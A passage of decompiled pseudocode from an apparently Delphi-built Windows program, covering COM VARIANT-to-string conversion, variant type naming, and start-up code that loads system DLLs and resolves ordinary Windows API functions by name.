              unknown_libname_47(a1, *a2->plVal);
              goto LABEL_64;
            }
          }
          else
          {
            if ( v9 == 20 )
            {
              sub_415178(&v25, v8, a3, *a2->pllVal);
              System::__linkproc__ WStrFromLStr(a1, v25);
              goto LABEL_64;
            }
            v10 = v9 - 16;
            if ( !v10 )
            {
              sub_415150(*a2->pcVal, &v29);
              System::__linkproc__ WStrFromLStr(a1, v29);
              goto LABEL_64;
            }
            v11 = v10 - 1;
            if ( !v11 )
            {
              sub_415150(*a2->pbVal, &v28);
              System::__linkproc__ WStrFromLStr(a1, v28);
              goto LABEL_64;
            }
            v12 = v11 - 1;
            if ( !v12 )
            {
              sub_415150(*a2->bstrVal, &v27);
              System::__linkproc__ WStrFromLStr(a1, v27);
              goto LABEL_64;
            }
            if ( v12 == 1 )
            {
              unknown_libname_74(*a2->plVal, &v26);
              System::__linkproc__ WStrFromLStr(a1, v26);
              goto LABEL_64;
            }
          }
LABEL_61:
          unknown_libname_114(a2, &v23);
          System::__linkproc__ WStrAsg(a1, v23);
        }
        else if ( v9 == 12 )
        {
LABEL_20:
          sub_41F908(a1, a2->lVal);
        }
        else
        {
          switch ( v9 )
          {
            case 2:
              sub_415150(*a2->piVal, &v34);
              System::__linkproc__ WStrFromLStr(a1, v34);
              break;
            case 3:
              sub_415150(*a2->plVal, &v33);
              System::__linkproc__ WStrFromLStr(a1, v33);
              break;
            case 4:
              v19 = &savedregs;
              v18 = &loc_41FD78;
              ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
              __writefsdword(0, (unsigned int)&ExceptionList);
              v49 = *a2->pfltVal;
              sub_4173D8(off_46811C, &v53, a3, SBYTE8(v49), SDWORD1(v49), SLODWORD(v49));
              System::__linkproc__ WStrFromLStr(a1, v53);
              __writefsdword(0, (unsigned int)ExceptionList);
              v19 = (int *)&loc_41FF99;
              sub_406C44(&v53);
              break;
            case 5:
              v19 = &savedregs;
              v18 = &loc_41FDCE;
              ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
              __writefsdword(0, (unsigned int)&ExceptionList);
              v48 = *a2->pdblVal;
              sub_4173D8(off_46811C, &v52, a3, SBYTE8(v48), SDWORD1(v48), SLODWORD(v48));
              System::__linkproc__ WStrFromLStr(a1, v52);
              __writefsdword(0, (unsigned int)ExceptionList);
              v19 = (int *)&loc_41FF99;
              sub_406C44(&v52);
              break;
            case 6:
              unknown_libname_109((int)&v32, v8, a3, *(_DWORD *)(a2->lVal + 4), *a2->plVal);
              System::__linkproc__ WStrAsg(a1, v32);
              break;
            case 7:
              unknown_libname_110((int)&v31, v8, a3, *(_DWORD *)(a2->lVal + 4), *a2->plVal);
              System::__linkproc__ WStrAsg(a1, v31);
              break;
            case 8:
              goto LABEL_50;
            case 11:
              unknown_libname_111(*a2->bstrVal, &v30);
              System::__linkproc__ WStrAsg(a1, v30);
              break;
            default:
              goto LABEL_61;
          }
        }
      }
      else
      {
        v15 = (_DWORD *)System::__linkproc__ WStrClr(a1, v8);
        if ( !sub_41F82C(&a2->vt, v15) )
        {
          unknown_libname_114(a2, &v22);
          System::__linkproc__ WStrAsg(a1, v22);
        }
      }
LABEL_64:
      __writefsdword(0, v20[0]);
      v21 = (int *)&loc_420035;
      System::__linkproc__ WStrArrayClr(&v22, 2);
      sub_406CA4((int)&v24, 6);
      System::__linkproc__ WStrArrayClr(&v30, 3);
      sub_406CA4((int)&v33, 2);
      System::__linkproc__ WStrArrayClr(&v35, 2);
      sub_406CA4((int)&v37, 6);
      System::__linkproc__ WStrArrayClr(&v43, 3);
      sub_406CA4((int)&v46, 2);
      return sub_406CA4((int)&v52, 4);
  }
}
// 406C8C: using guessed type int __fastcall System::__linkproc__ WStrClr(_DWORD, _DWORD);
// 406D04: using guessed type int __fastcall System::__linkproc__ WStrArrayClr(_DWORD, _DWORD);
// 40765C: using guessed type int __fastcall unknown_libname_46(_DWORD, _DWORD);
// 40768C: using guessed type int __fastcall unknown_libname_47(_DWORD, _DWORD);
// 407874: using guessed type int __fastcall System::__linkproc__ WStrFromLStr(_DWORD, _DWORD);
// 4151BC: using guessed type int __fastcall unknown_libname_74(_DWORD, _DWORD);
// 4151D0: using guessed type _DWORD __stdcall unknown_libname_75(_DWORD, _DWORD);
// 41EC7C: using guessed type int __fastcall unknown_libname_111(_DWORD, _DWORD);
// 41F6FC: using guessed type int __fastcall unknown_libname_114(_DWORD, _DWORD);
// 466584: using guessed type char byte_466584;
// 466588: using guessed type int dword_466588;

//----- (00420128) --------------------------------------------------------
int __usercall sub_420128@<eax>(volatile __int32 *a1@<eax>, VARIANTARG *a2@<edx>, int a3@<ecx>, int a4@<edi>)
{
  int vt; // eax
  int v7; // edx
  int v8; // edx
  int v9; // eax
  int v10; // eax
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  _DWORD *v15; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-DCh] BYREF
  void *v18; // [esp-14h] [ebp-D8h]
  int *v19; // [esp-10h] [ebp-D4h]
  int v20[2]; // [esp-Ch] [ebp-D0h] BYREF
  int *v21; // [esp-4h] [ebp-C8h]
  int v22; // [esp+8h] [ebp-BCh] BYREF
  int v23; // [esp+Ch] [ebp-B8h] BYREF
  int v24; // [esp+10h] [ebp-B4h] BYREF
  int v25; // [esp+14h] [ebp-B0h] BYREF
  int v26; // [esp+18h] [ebp-ACh] BYREF
  int v27; // [esp+1Ch] [ebp-A8h] BYREF
  int v28; // [esp+20h] [ebp-A4h] BYREF
  int v29; // [esp+24h] [ebp-A0h] BYREF
  int v30; // [esp+28h] [ebp-9Ch] BYREF
  int v31; // [esp+2Ch] [ebp-98h] BYREF
  int v32; // [esp+30h] [ebp-94h] BYREF
  int v33; // [esp+34h] [ebp-90h] BYREF
  int v34[2]; // [esp+38h] [ebp-8Ch] BYREF
  int v35; // [esp+40h] [ebp-84h] BYREF
  int v36; // [esp+44h] [ebp-80h] BYREF
  int v37; // [esp+48h] [ebp-7Ch] BYREF
  int v38; // [esp+4Ch] [ebp-78h] BYREF
  BSTR v39; // [esp+50h] [ebp-74h] BYREF
  int v40; // [esp+54h] [ebp-70h] BYREF
  int v41; // [esp+58h] [ebp-6Ch] BYREF
  int v42; // [esp+5Ch] [ebp-68h] BYREF
  int v43; // [esp+60h] [ebp-64h] BYREF
  int v44; // [esp+64h] [ebp-60h] BYREF
  int v45; // [esp+68h] [ebp-5Ch] BYREF
  int v46; // [esp+6Ch] [ebp-58h] BYREF
  int v47; // [esp+70h] [ebp-54h] BYREF
  long double v48; // [esp+74h] [ebp-50h]
  long double v49; // [esp+84h] [ebp-40h]
  long double dblVal; // [esp+94h] [ebp-30h]
  long double fltVal; // [esp+A4h] [ebp-20h]
  int v52; // [esp+B4h] [ebp-10h] BYREF
  int v53; // [esp+B8h] [ebp-Ch] BYREF
  int v54; // [esp+BCh] [ebp-8h] BYREF
  int v55; // [esp+C0h] [ebp-4h] BYREF
  int savedregs; // [esp+C4h] [ebp+0h] BYREF

  v21 = &savedregs;
  v20[1] = (int)&loc_420828;
  v20[0] = (int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v20);
  vt = a2->vt;
  v7 = (unsigned __int16)vt;
  switch ( (__int16)vt )
  {
    case 0:
      sub_406C44(a1);
      goto LABEL_64;
    case 1:
      if ( byte_466584 )
      {
        LOWORD(v7) = 8;
        LOWORD(vt) = 1;
        sub_41E228(vt, v7, a4);
      }
      sub_406FE8(a1, dword_466588);
      goto LABEL_64;
    case 2:
      sub_415150(a2->iVal, &v47);
      sub_406FE8(a1, v47);
      goto LABEL_64;
    case 3:
      sub_415150(a2->lVal, &v46);
      sub_406FE8(a1, v46);
      goto LABEL_64;
    case 4:
      v19 = &savedregs;
      v18 = &loc_420270;
      ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)&ExceptionList);
      fltVal = a2->fltVal;
      sub_4173D8(off_46811C, &v55, a3, SBYTE8(fltVal), SDWORD1(fltVal), SLODWORD(fltVal));
      sub_406FE8(a1, v55);
      __writefsdword(0, (unsigned int)ExceptionList);
      v19 = (int *)&loc_4207D0;
      sub_406C44(&v55);
      goto LABEL_64;
    case 5:
      v19 = &savedregs;
      v18 = &loc_4202C4;
      ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)&ExceptionList);
      dblVal = a2->dblVal;
      sub_4173D8(off_46811C, &v54, a3, SBYTE8(dblVal), SDWORD1(dblVal), SLODWORD(dblVal));
      sub_406FE8(a1, v54);
      __writefsdword(0, (unsigned int)ExceptionList);
      v19 = (int *)&loc_4207D0;
      sub_406C44(&v54);
      goto LABEL_64;
    case 6:
      unknown_libname_109((int)&v38, (unsigned __int16)vt, a3, a2->cyVal.Hi, a2->lVal);
      System::__linkproc__ LStrFromWStr(a1, v38);
      goto LABEL_64;
    case 7:
      unknown_libname_110((int)&v37, (unsigned __int16)vt, a3, a2->cyVal.Hi, a2->lVal);
      System::__linkproc__ LStrFromWStr(a1, v37);
      goto LABEL_64;
    case 8:
      sub_4076FC(a2->lVal, 1, 0x7FFFFFFF, &v39);
      System::__linkproc__ LStrFromWStr(a1, v39);
      goto LABEL_64;
    case 9:
    case 13:
      unknown_libname_114(a2, &v35);
      System::__linkproc__ LStrFromWStr(a1, v35);
      goto LABEL_64;
    case 11:
      unknown_libname_111(a2->uiVal, &v36);
      System::__linkproc__ LStrFromWStr(a1, v36);
      goto LABEL_64;
    case 12:
      goto LABEL_16;
    case 16:
      sub_415150(a2->cVal, &v45);
      sub_406FE8(a1, v45);
      goto LABEL_64;
    case 17:
      sub_415150(a2->bVal, &v44);
      sub_406FE8(a1, v44);
      goto LABEL_64;
    case 18:
      sub_415150(a2->uiVal, &v43);
      sub_406FE8(a1, v43);
      goto LABEL_64;
    case 19:
      unknown_libname_74(a2->lVal, &v42);
      sub_406FE8(a1, v42);
      goto LABEL_64;
    case 20:
      sub_415178(&v41, (unsigned __int16)vt, a3, a2->llVal);
      sub_406FE8(a1, v41);
      goto LABEL_64;
    case 21:
      unknown_libname_75(a2->lVal, a2->cyVal.Hi);
      sub_406FE8(a1, v40);
      goto LABEL_64;
    default:
      HIWORD(v8) = HIWORD(vt);
      if ( (_WORD)vt == 256 )
      {
        sub_407840(a1, a2->lVal, v20[0]);
        goto LABEL_64;
      }
      if ( (_WORD)vt == 257 )
      {
        unknown_libname_116(a2);
        sub_406FE8(a1, v34[1]);
        goto LABEL_64;
      }
      LOWORD(v8) = vt - 258;
      if ( (_WORD)vt == 258 )
      {
        sub_406FE8(a1, a2->lVal);
        goto LABEL_64;
      }
      if ( (vt & 0x4000) != 0 )
      {
        v9 = vt & 0xBFFF;
        if ( v9 > 12 )
        {
          if ( v9 > 20 )
          {
            v13 = v9 - 21;
            if ( !v13 )
            {
              unknown_libname_75(*a2->plVal, *(_DWORD *)(a2->lVal + 4));
              sub_406FE8(a1, v27);
              goto LABEL_64;
            }
            v14 = v13 - 235;
            if ( !v14 )
            {
              unknown_libname_49(a1, *a2->plVal);
              goto LABEL_64;
            }
            if ( v14 == 2 )
            {
LABEL_57:
              unknown_libname_50(a1, *a2->plVal);
              goto LABEL_64;
            }
          }
          else
          {
            if ( v9 == 20 )
            {
              sub_415178(&v28, v8, a3, *a2->pllVal);
              sub_406FE8(a1, v28);
              goto LABEL_64;
            }
            v10 = v9 - 16;
            if ( !v10 )
            {
              sub_415150(*a2->pcVal, &v32);
              sub_406FE8(a1, v32);
              goto LABEL_64;
            }
            v11 = v10 - 1;
            if ( !v11 )
            {
              sub_415150(*a2->pbVal, &v31);
              sub_406FE8(a1, v31);
              goto LABEL_64;
            }
            v12 = v11 - 1;
            if ( !v12 )
            {
              sub_415150(*a2->bstrVal, &v30);
              sub_406FE8(a1, v30);
              goto LABEL_64;
            }
            if ( v12 == 1 )
            {
              unknown_libname_74(*a2->plVal, &v29);
              sub_406FE8(a1, v29);
              goto LABEL_64;
            }
          }
LABEL_61:
          unknown_libname_114(a2, &v23);
          System::__linkproc__ LStrFromWStr(a1, v23);
        }
        else if ( v9 == 12 )
        {
LABEL_16:
          sub_420128(a1, a2->lVal);
        }
        else
        {
          switch ( v9 )
          {
            case 2:
              sub_415150(*a2->piVal, v34);
              sub_406FE8(a1, v34[0]);
              break;
            case 3:
              sub_415150(*a2->plVal, &v33);
              sub_406FE8(a1, v33);
              break;
            case 4:
              v19 = &savedregs;
              v18 = &loc_4205AC;
              ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
              __writefsdword(0, (unsigned int)&ExceptionList);
              v49 = *a2->pfltVal;
              sub_4173D8(off_46811C, &v53, a3, SBYTE8(v49), SDWORD1(v49), SLODWORD(v49));
              sub_406FE8(a1, v53);
              __writefsdword(0, (unsigned int)ExceptionList);
              v19 = (int *)&loc_4207D0;
              sub_406C44(&v53);
              break;
            case 5:
              v19 = &savedregs;
              v18 = &loc_420602;
              ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
              __writefsdword(0, (unsigned int)&ExceptionList);
              v48 = *a2->pdblVal;
              sub_4173D8(off_46811C, &v52, a3, SBYTE8(v48), SDWORD1(v48), SLODWORD(v48));
              sub_406FE8(a1, v52);
              __writefsdword(0, (unsigned int)ExceptionList);
              v19 = (int *)&loc_4207D0;
              sub_406C44(&v52);
              break;
            case 6:
              unknown_libname_109((int)&v26, v8, a3, *(_DWORD *)(a2->lVal + 4), *a2->plVal);
              System::__linkproc__ LStrFromWStr(a1, v26);
              break;
            case 7:
              unknown_libname_110((int)&v25, v8, a3, *(_DWORD *)(a2->lVal + 4), *a2->plVal);
              System::__linkproc__ LStrFromWStr(a1, v25);
              break;
            case 8:
              goto LABEL_57;
            case 11:
              unknown_libname_111(*a2->bstrVal, &v24);
              System::__linkproc__ LStrFromWStr(a1, v24);
              break;
            default:
              goto LABEL_61;
          }
        }
      }
      else
      {
        v15 = sub_406C44(a1);
        if ( !(unsigned __int8)unknown_libname_117(a2, v15) )
        {
          unknown_libname_114(a2, &v22);
          System::__linkproc__ LStrFromWStr(a1, v22);
        }
      }
LABEL_64:
      __writefsdword(0, v20[0]);
      v21 = (int *)&loc_42082F;
      System::__linkproc__ WStrArrayClr(&v22, 5);
      sub_406CA4((int)&v27, 9);
      System::__linkproc__ WStrArrayClr(&v35, 5);
      sub_406CA4((int)&v40, 8);
      return sub_406CA4((int)&v52, 4);
  }
}
// 406D04: using guessed type int __fastcall System::__linkproc__ WStrArrayClr(_DWORD, _DWORD);
// 4077B8: using guessed type int __fastcall unknown_libname_49(_DWORD, _DWORD);
// 4077E8: using guessed type int __fastcall unknown_libname_50(_DWORD, _DWORD);
// 407860: using guessed type int __fastcall System::__linkproc__ LStrFromWStr(_DWORD, _DWORD);
// 4151BC: using guessed type int __fastcall unknown_libname_74(_DWORD, _DWORD);
// 4151D0: using guessed type _DWORD __stdcall unknown_libname_75(_DWORD, _DWORD);
// 41EC7C: using guessed type int __fastcall unknown_libname_111(_DWORD, _DWORD);
// 41F6FC: using guessed type int __fastcall unknown_libname_114(_DWORD, _DWORD);
// 4200A0: using guessed type int __fastcall unknown_libname_117(_DWORD, _DWORD);
// 466584: using guessed type char byte_466584;
// 466588: using guessed type int dword_466588;

//----- (00420AB4) --------------------------------------------------------
int __usercall sub_420AB4@<eax>(
        unsigned __int16 a1@<ax>,
        volatile __int32 *a2@<edx>,
        int a3@<ecx>,
        int a4@<ebx>,
        int a5@<edi>,
        int a6@<esi>)
{
  char v7; // bh
  unsigned __int16 v8; // di
  unsigned int v10[2]; // [esp-18h] [ebp-24h] BYREF
  int *v11; // [esp-10h] [ebp-1Ch]
  int v12; // [esp-Ch] [ebp-18h]
  int v13; // [esp-8h] [ebp-14h]
  int v14; // [esp-4h] [ebp-10h]
  void *v15; // [esp+0h] [ebp-Ch] BYREF
  int v16; // [esp+4h] [ebp-8h] BYREF
  int *v17; // [esp+8h] [ebp-4h] BYREF
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v17 = 0;
  v16 = 0;
  v15 = 0;
  v14 = a4;
  v13 = a6;
  v12 = a5;
  v7 = HIBYTE(a1);
  v11 = &savedregs;
  v10[1] = (unsigned int)&loc_420BC7;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  v8 = a1 & 0xFFF;
  if ( (a1 & 0xFFFu) > 0x15 )
  {
    switch ( a1 )
    {
      case 0x100u:
        sub_406FE8(a2, (int)L"String");
        break;
      case 0x102u:
        sub_406FE8(a2, (int)L"UnicodeString");
        break;
      case 0x101u:
        sub_406FE8(a2, (int)L"Any");
        break;
      default:
        if ( sub_420F78(a1, &v17, a3) )
        {
          sub_405514(*v17, (int)&v16);
          sub_407AD8(v16, 2, 0x7FFFFFFF, a2);
        }
        else
        {
          sub_4154B0(v8, 4, (int *)&v15);
          sub_407968(a2, *off_468198, v15);
        }
        break;
    }
  }
  else
  {
    sub_406FE8(a2, (int)(&off_466594)[v8]);
  }
  if ( (v7 & 0x20) != 0 )
    sub_407968(a2, L"Array ", *(_DWORD **)a2);
  if ( (v7 & 0x40) != 0 )
    sub_407968(a2, L"ByRef ", *(_DWORD **)a2);
  __writefsdword(0, v10[0]);
  v11 = (int *)&loc_420BCE;
  return sub_406CA4((int)&v15, 2);
}
// 420AB4: could not find valid save-restore pair for ebx
// 420AB4: could not find valid save-restore pair for edi
// 420AB4: could not find valid save-restore pair for esi
// 420BE4: using guessed type wchar_t aString[7];
// 420C00: using guessed type wchar_t aUnicodestring[14];
// 420C28: using guessed type wchar_t aAny[4];
// 420C3C: using guessed type wchar_t aArray[7];
// 420C58: using guessed type wchar_t aByref[7];
// 466594: using guessed type wchar_t *off_466594;
// 468198: using guessed type int **off_468198;

//----- (00420D30) --------------------------------------------------------
int sub_420D30()
{
  int v0; // eax
  char v1; // dl
  int v2; // ecx
  unsigned __int16 v3; // ax
  int v4; // ecx
  int result; // eax
  int v6[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v7; // [esp-4h] [ebp-Ch]
  char v8; // [esp+3h] [ebp-5h]
  int v9; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v0 = System::__linkproc__ BeforeDestruction();
  v8 = v1;
  v9 = v0;
  sub_405B84((_DWORD *)dword_46E914, 0xFFFFFFFF, v2);
  v7 = &savedregs;
  v6[1] = (int)&loc_420DAC;
  v6[0] = (int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  v3 = *(_WORD *)(v9 + 4);
  if ( v3 )
  {
    *(_DWORD *)(dword_46E910 + 4 * v3 - 1024) = 0;
    *(_DWORD *)(dword_46E910 + 4 * *(unsigned __int16 *)(v9 + 4) - 1024) = dword_466590;
  }
  v4 = (int)v7;
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_420DB3;
  sub_405D80((_DWORD *)dword_46E914, v6[0], v4);
  result = sub_405588();
  if ( v8 > 0 )
    return System::__linkproc__ ClassDestroy(v9);
  return result;
}
// 420D3B: variable 'v1' is possibly undefined
// 420D49: variable 'v2' is possibly undefined
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);
// 40591C: using guessed type int System::__linkproc__ BeforeDestruction(void);
// 466590: using guessed type int dword_466590;
// 46E910: using guessed type int dword_46E910;
// 46E914: using guessed type int dword_46E914;

//----- (00420E6C) --------------------------------------------------------
int __fastcall sub_420E6C(int a1, int a2, int a3, int a4)
{
  unsigned __int8 v5; // [esp+Bh] [ebp-1h]

  (*(void (__fastcall **)(int, int))(*(_DWORD *)a1 + 56))(a1, a2);
  return byte_4665EC[3 * a4 - 42 + v5];
}
// 420E7F: variable 'v5' is possibly undefined
// 4665EC: using guessed type unsigned __int8 byte_4665EC[20];

//----- (00420ED8) --------------------------------------------------------
int sub_420ED8()
{
  return 0;
}

//----- (00420EDC) --------------------------------------------------------
char __fastcall sub_420EDC(int a1, int a2, int a3, _WORD *a4)
{
  *a4 = *(_WORD *)(a1 + 4);
  return 1;
}

//----- (00420EF8) --------------------------------------------------------
// attributes: thunk
_DWORD *__usercall sub_420EF8@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  return sub_41E1D4(a1, a2, a3);
}

//----- (00420F00) --------------------------------------------------------
// attributes: thunk
_DWORD *__usercall sub_420F00@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  return sub_41E2CC(a1, a2, a3);
}

//----- (00420F08) --------------------------------------------------------
// attributes: thunk
_DWORD *__usercall sub_420F08@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  return sub_41E6A4(a1, a2, a3);
}

//----- (00420F10) --------------------------------------------------------
char __fastcall sub_420F10(int a1, int a2, int a3, _WORD *a4)
{
  *a4 = *(_WORD *)(a1 + 4);
  return 1;
}

//----- (00420F24) --------------------------------------------------------
// attributes: thunk
_DWORD *__usercall sub_420F24@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  return sub_420F00(a1, a2, a3);
}

//----- (00420F78) --------------------------------------------------------
BOOL __fastcall sub_420F78(unsigned __int16 a1, _DWORD *a2, int a3)
{
  bool v5; // al
  int v6; // eax
  int v7; // ecx
  bool v8; // al
  int v9; // ecx
  int v11[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v12; // [esp-4h] [ebp-10h]
  bool v13; // [esp+Bh] [ebp-1h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v5 = dword_46E910 && a1 >= 0x100u && a1 <= 0x7FFu;
  v13 = v5;
  if ( v5 )
  {
    sub_405B84((_DWORD *)dword_46E914, 0xFFFFFFFF, a3);
    v12 = &savedregs;
    v11[1] = (int)&loc_42102A;
    v11[0] = (int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v11);
    v6 = dword_46E910;
    if ( dword_46E910 )
      v6 = *(_DWORD *)(dword_46E910 - 4);
    v7 = a1 - 256;
    v13 = v6 > v7;
    if ( v6 > v7 )
    {
      *a2 = *(_DWORD *)(dword_46E910 + 4 * a1 - 1024);
      v8 = *a2 && *a2 != dword_466590;
      v13 = v8;
    }
    v9 = (int)v12;
    __writefsdword(0, v11[0]);
    v12 = (int *)&loc_421031;
    sub_405D80((_DWORD *)dword_46E914, v11[0], v9);
  }
  return v13;
}
// 466590: using guessed type int dword_466590;
// 46E910: using guessed type int dword_46E910;
// 46E914: using guessed type int dword_46E914;

//----- (0042103C) --------------------------------------------------------
int sub_42103C()
{
  int result; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-Ch] BYREF
  void *v2; // [esp-8h] [ebp-8h]
  int *v3; // [esp-4h] [ebp-4h]
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v3 = &savedregs;
  v2 = &loc_42108C;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( !++dword_46E90C )
  {
    sub_420C98(ExceptionList, v2, v3);
    sub_405598((_DWORD *)dword_46E914);
    sub_406C44(&dword_466588);
    sub_408B34(&dword_46E910, (int)&byte_420C6C);
  }
  result = 0;
  __writefsdword(0, (unsigned int)ExceptionList);
  return result;
}
// 420C6C: using guessed type char byte_420C6C;
// 420C98: using guessed type int __cdecl sub_420C98(_DWORD, _DWORD, _DWORD);
// 466588: using guessed type int dword_466588;
// 46E90C: using guessed type int dword_46E90C;
// 46E910: using guessed type int dword_46E910;
// 46E914: using guessed type int dword_46E914;

//----- (004214C0) --------------------------------------------------------
FARPROC __fastcall sub_4214C0(int a1, const CHAR *a2)
{
  return sub_40C598(dword_46E918[a1], a2);
}
// 46E918: using guessed type HMODULE dword_46E918[12];

//----- (004214F0) --------------------------------------------------------
int sub_4214F0()
{
  int v0; // ecx
  _WORD *v1; // eax
  WCHAR *v2; // eax
  int v3; // eax
  int v4; // ecx
  int v5; // eax
  const WCHAR *v6; // eax
  HMODULE LibraryW; // eax
  UINT v9; // [esp-10h] [ebp-28h]
  unsigned int v10[2]; // [esp-Ch] [ebp-24h] BYREF
  int *v11; // [esp-4h] [ebp-1Ch]
  int v12; // [esp+0h] [ebp-18h]
  int v13; // [esp+4h] [ebp-14h]
  int v14; // [esp+8h] [ebp-10h] BYREF
  void *v15; // [esp+Ch] [ebp-Ch] BYREF
  HMODULE hModule; // [esp+10h] [ebp-8h]
  int i; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v15 = 0;
  v14 = 0;
  v11 = &savedregs;
  v10[1] = (unsigned int)&loc_421AA4;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  sub_406C44(&v15);
  sub_407890(&v15, 1024, v0);
  v1 = (_WORD *)sub_407790((int)v15);
  sub_40C8D0(v1, 2048);
  v9 = System::__linkproc__ LStrLen(v15);
  v2 = (WCHAR *)sub_407790((int)v15);
  GetSystemDirectoryW(v2, v9);
  v3 = System::__linkproc__ LStrLen(v15);
  if ( v3 > 0 )
  {
    v12 = v3;
    v13 = 1;
    while ( *((_WORD *)v15 + v13 - 1) )
    {
      ++v13;
      if ( !--v12 )
        goto LABEL_6;
    }
    sub_407890(&v15, v13 - 1, v4);
  }
LABEL_6:
  if ( System::__linkproc__ LStrLen(v15) > 0 )
  {
    v5 = System::__linkproc__ LStrLen(v15);
    if ( *((_WORD *)v15 + v5 - 1) != 92 )
      sub_407910((volatile __int32 *)&v15, &dword_421ABC);
  }
  for ( i = 0; i != 12; ++i )
  {
    sub_407968(&v14, v15, *(&off_466600 + i));
    v6 = (const WCHAR *)sub_407790(v14);
    LibraryW = LoadLibraryW(v6);
    dword_46E918[i] = LibraryW;
  }
  dword_466700 = (int)sub_4214C0(0, (const CHAR *)L"GetLogicalProcessorInformation");
  dword_466704 = (int)sub_4214C0(0, (const CHAR *)L"GetLogicalProcessorInformationEx");
  dword_466708 = (int)sub_4214C0(0, (const CHAR *)L"RegDeleteKeyExW");
  dword_46670C = (int)sub_4214C0(0, (const CHAR *)L"GetNativeSystemInfo");
  dword_466710 = (int)sub_4214C0(0, (const CHAR *)L"IsWow64Process");
  dword_466714 = (int)sub_4214C0(0, (const CHAR *)L"GetProductInfo");
  dword_466718 = (int)sub_4214C0(0, (const CHAR *)L"QueryDosDeviceW");
  dword_46671C = (int)sub_4214C0(0, (const CHAR *)L"GetLogicalDriveStringsW");
  dword_466720 = (int)sub_4214C0(0, (const CHAR *)L"GetFinalPathNameByHandleW");
  dword_466724 = (int)sub_4214C0(0, (const CHAR *)L"Wow64DisableWow64FsRedirection");
  dword_466728 = (int)sub_4214C0(0, (const CHAR *)L"Wow64RevertWow64FsRedirection");
  dword_46672C = (int)sub_4214C0(0, (const CHAR *)L"GetUserDefaultLocaleName");
  dword_466730 = (int)sub_4214C0(0, (const CHAR *)L"CreateHardLinkW");
  dword_466734 = (int)sub_4214C0(0, (const CHAR *)L"SetThreadDescription");
  dword_466738 = (int)sub_4214C0(0, (const CHAR *)L"GetThreadDescription");
  dword_46673C = (int)sub_4214C0(0, (const CHAR *)L"GetSystemFirmwareTable");
  dword_466740 = (int)sub_4214C0(0, (const CHAR *)L"GetTickCount64");
  dword_466744 = (int)sub_4214C0(0, (const CHAR *)L"BaseFlushAppcompatCache");
  dword_466748 = (int)sub_4214C0(0, (const CHAR *)L"PowerCreateRequest");
  dword_46674C = (int)sub_4214C0(0, (const CHAR *)L"PowerSetRequest");
  dword_466750 = (int)sub_4214C0(0, (const CHAR *)L"PowerClearRequest");
  dword_466754 = (int)sub_4214C0(5, (const CHAR *)L"GetFileVersionInfoSizeW");
  dword_466758 = (int)sub_4214C0(5, (const CHAR *)L"GetFileVersionInfoW");
  dword_46675C = (int)sub_4214C0(5, (const CHAR *)L"VerQueryValueW");
  dword_466760 = (int)sub_4214C0(6, (const CHAR *)L"GetModuleFileNameExW");
  dword_466764 = (int)sub_4214C0(6, (const CHAR *)L"GetProcessImageFileNameW");
  dword_466768 = (int)sub_4214C0(6, (const CHAR *)L"GetProcessMemoryInfo");
  dword_46676C = (int)sub_4214C0(6, (const CHAR *)L"GetModuleInformation");
  dword_466770 = (int)sub_4214C0(6, (const CHAR *)L"EnumProcessModules");
  dword_466774 = (int)sub_4214C0(8, (const CHAR *)L"ShutdownBlockReasonCreate");
  dword_466778 = (int)sub_4214C0(8, (const CHAR *)L"ShutdownBlockReasonQuery");
  dword_46677C = (int)sub_4214C0(8, (const CHAR *)L"ShutdownBlockReasonDestroy");
  dword_466780 = (int)sub_4214C0(8, (const CHAR *)L"SetProcessDPIAware");
  dword_466784 = (int)sub_4214C0(1, (const CHAR *)L"SHGetKnownFolderPath");
  dword_466788 = (int)sub_4214C0(1, (const CHAR *)L"Shell_NotifyIconGetRect");
  dword_46678C = (int)sub_4214C0(1, (const CHAR *)L"SHQueryUserNotificationState");
  dword_466790 = (int)sub_4214C0(2, (const CHAR *)L"CoCreateInstanceEx");
  dword_466794 = (int)sub_4214C0(2, (const CHAR *)L"CoInitializeEx");
  dword_466798 = (int)sub_4214C0(2, (const CHAR *)L"CoAddRefServerProcess");
  dword_46679C = (int)sub_4214C0(2, (const CHAR *)L"CoReleaseServerProcess");
  dword_4667A0 = (int)sub_4214C0(2, (const CHAR *)L"CoResumeClassObjects");
  dword_4667A4 = (int)sub_4214C0(2, (const CHAR *)L"CoSuspendClassObjects");
  dword_4667A8 = (int)sub_4214C0(4, (const CHAR *)L"SetProcessDpiAwareness");
  dword_4667AC = (int)sub_4214C0(4, (const CHAR *)L"GetDpiForMonitor");
